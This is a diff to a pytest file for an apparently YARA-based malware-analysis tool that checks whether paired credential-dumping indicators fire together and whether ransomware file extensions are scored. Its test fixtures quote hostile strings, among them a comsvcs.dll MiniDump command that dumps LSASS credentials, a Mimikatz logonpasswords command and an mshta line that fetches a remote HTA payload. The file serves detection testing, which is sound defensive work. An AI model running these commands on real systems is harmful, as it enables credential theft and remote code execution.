@@ -460,6 +460,8 @@ class TestEachTightenedRuleStillFiresOnItsArtefact:
         ("registry_modification", b"Software\\Policies\\System\\EnableLUA\x00"),
         ("sandbox_evasion", b"CheckRemoteDebuggerPresent\x00vboxservice\x00"),
         ("lsass_dump", b"sekurlsa::logonpasswords\x00"),
+        ("lsass_dump", b"comsvcs.dll MiniDump 624 C:\\out.dmp full\x00"),
+        ("lsass_dump", b"MiniDumpWriteDump\x00lsass.exe\x00"),
         ("rundll32_abuse", b'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"\x00'),
         ("mshta_abuse", b"mshta http://198.51.100.9/a.hta\x00"),
         ("ransomware_indicators", b"ALL YOUR FILES ARE ENCRYPTED\x00_readme.txt\x00"),
@@ -475,3 +477,107 @@ class TestEachTightenedRuleStillFiresOnItsArtefact:
     @pytest.mark.parametrize(("rule_id", "artefact"), ARTEFACTS)
     def test_the_rule_still_carries_its_technique(self, rule_id: str, artefact: bytes) -> None:
         assert _asserted(artefact).get(rule_id)
+
+
+class TestATechniqueThatIsAPairNeedsBothHalves:
+    """`MiniDumpWriteDump` is in a crash reporter and `lsass.exe` is in every
+    process lister. Either alone carried T1003.001 at 0.91 — the highest
+    authored confidence in the file."""
+
+    def test_the_dump_call_alone_asserts_nothing(self) -> None:
+        blob = b"MiniDumpWriteDump\x00DbgHelp.dll\x00CreateDumpFile\x00"
+        assert _asserted(blob) == {}
+        assert "process_dump_apis" in _fired(blob)
+
+    def test_the_image_name_alone_asserts_nothing(self) -> None:
+        blob = b"lsass.exe\x00csrss.exe\x00services.exe\x00EnumProcesses\x00"
+        assert _asserted(blob) == {}
+        assert "process_dump_apis" in _fired(blob)
+
+    def test_both_together_assert_the_technique(self) -> None:
+        assert _asserted(b"MiniDumpWriteDump\x00lsass.exe\x00").get("lsass_dump") == "T1003.001"
+
+    def test_the_mimikatz_string_still_asserts_on_its_own(self) -> None:
+        assert _asserted(b"sekurlsa::logonpasswords\x00").get("lsass_dump") == "T1003.001"
+
+
+class TestAnExtensionIsNotARenaming:
+    """What makes an extension evidence is the renaming, which the rule file
+    cannot express across two groups; so the extensions observe and the note
+    wordings assert."""
+
+    def test_an_ordinary_file_name_asserts_nothing(self) -> None:
+        for blob in (
+            b"C:\\Users\\a\\Documents\\notes.encrypted\x00",
+            b"vault backup.locked\x00",
+            b"archive.crypt\x00",
+        ):
+            assert _asserted(blob) == {}
+            assert "encrypted_file_extensions" in _fired(blob)
+
+    def test_a_ransom_note_still_asserts(self) -> None:
+        blob = b"ALL YOUR FILES ARE ENCRYPTED\x00_readme.txt\x00"
+        assert _asserted(blob).get("ransomware_indicators") == "T1486"
+
+    def test_a_tor_address_is_not_a_ransomware_extension(self) -> None:
+        """`.onion` was in the extension list, so every hidden-service address
+        in any sample read as ransomware."""
+        assert _fired(b"expyuzz4wqqyqhjn.onion\x00") == set()
+
+
+class TestTheTogetherGroupInTheRuleFile:
+    def test_a_rule_reads_its_all_of_group(self) -> None:
+        rule = YaraTTPRule.from_dict(
+            {
+                "id": "pair",
+                "technique_id": "T1003.001",
+                "confidence": 0.9,
+                "description": "a pair",
+                "patterns": ["alone"],
+                "all_of": ["first", "second"],
+            }
+        )
+        assert rule.all_of == ("first", "second")
+
+    def test_a_rule_without_one_has_an_empty_group(self) -> None:
+        rule = YaraTTPRule.from_dict(
+            {
+                "id": "single",
+                "technique_id": "T1055",
+                "confidence": 0.9,
+                "description": "one",
+                "patterns": ["alone"],
+            }
+        )
+        assert rule.all_of == ()
+
+    def test_the_regex_fallback_agrees_with_the_compiled_engine(self) -> None:
+        """A host without yara-python must reach the same answer."""
+        rules = [
+            YaraTTPRule.from_dict(
+                {
+                    "id": "pair",
+                    "technique_id": "T1003.001",
+                    "confidence": 0.9,
+                    "description": "a pair",
+                    "patterns": [],
+                    "all_of": ["first", "second"],
+                }
+            )
+        ]
+        from unittest.mock import patch
+
+        compiled = YaraLayer(rules)
+        with (
+            patch("maljan.analysis.yara_layer._YARA_AVAILABLE", False),
+            patch("maljan.analysis.yara_layer.yara", None),
+        ):
+            fallback = YaraLayer(rules)
+        for layer in (compiled, fallback):
+            assert layer.scan(b"first only") == []
+            fired = layer.scan(b"first and second")
+            assert [m.rule_id for m in fired] == ["pair"]
+        assert set(fallback.scan(b"first and second")[0].matched_patterns) == {
+            "first",
+            "second",
+        }
